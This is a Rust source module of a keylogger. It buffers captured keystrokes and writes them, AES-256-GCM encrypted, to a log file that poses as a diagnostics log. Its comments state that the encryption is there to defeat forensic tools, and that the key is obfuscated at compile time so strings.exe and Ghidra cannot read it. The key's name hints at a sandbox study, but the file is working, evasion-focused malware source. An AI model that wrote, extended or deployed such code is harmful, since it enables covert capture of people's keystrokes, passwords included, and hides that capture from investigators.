//! Buffers keystrokes and writes an AES-256-GCM encrypted backup to disk.
//!
//! FIX 5: Every disk write is encrypted so forensic tools cannot read plain
//!         keystrokes from the local log file.

use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce,
};
use chrono::Local;
use cryptify::encrypt_string;
use lazy_static::lazy_static;
use rand::RngCore;
use std::fs::OpenOptions;
use std::io::Write;
use std::sync::Mutex;

/// Returns the 32-byte AES-256 encryption key, decrypted from the binary at runtime.
/// The key is NOT stored as a plain `&[u8]` constant — strings.exe / Ghidra
/// will not see it as a readable literal.
fn encryption_key() -> Vec<u8> {
    encrypt_string!("SandboxStudyAESKey2026!!!!!!!!##").into_bytes()
}

lazy_static! {
    static ref KEY_BUFFER: Mutex<String> = Mutex::new(String::new());
}

/// Appends a keystroke string to the global in-memory buffer.
pub fn log_keystroke(s: &str) {
    let mut buffer = KEY_BUFFER.lock().unwrap();
    buffer.push_str(s);
}

/// Reads and clears the current buffer, returning its contents.
pub fn take_buffer() -> String {
    let mut buffer = KEY_BUFFER.lock().unwrap();
    std::mem::take(&mut *buffer)
}

/// Encrypts `data` with AES-256-GCM and appends the result to the local log
/// file with a timestamp prefix.
///
/// Format on disk (per line):
///   [timestamp] <hex-encoded 12-byte nonce>:<hex-encoded ciphertext>
pub fn write_to_file(data: &str) {
    let key_bytes = encryption_key();
    let cipher = Aes256Gcm::new_from_slice(&key_bytes).expect("key length is always 32 bytes");

    // Generate a fresh random 96-bit nonce for every write.
    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    match cipher.encrypt(nonce, data.as_bytes()) {
        Ok(ciphertext) => {
            let nonce_hex = hex_encode(&nonce_bytes);
            let ct_hex = hex_encode(&ciphertext);
            let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S");
            let line = format!("[{}] {}:{}", timestamp, nonce_hex, ct_hex);

            if let Ok(mut file) = OpenOptions::new()
                .create(true)
                .append(true)
                .open(crate::config::diagnostics_log())
            {
                let _ = writeln!(file, "{}", line);
            }
        }
        Err(_) => {
            // Encryption failure — silently skip to avoid crashing.
        }
    }
}

fn hex_encode(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{:02x}", b)).collect()
}
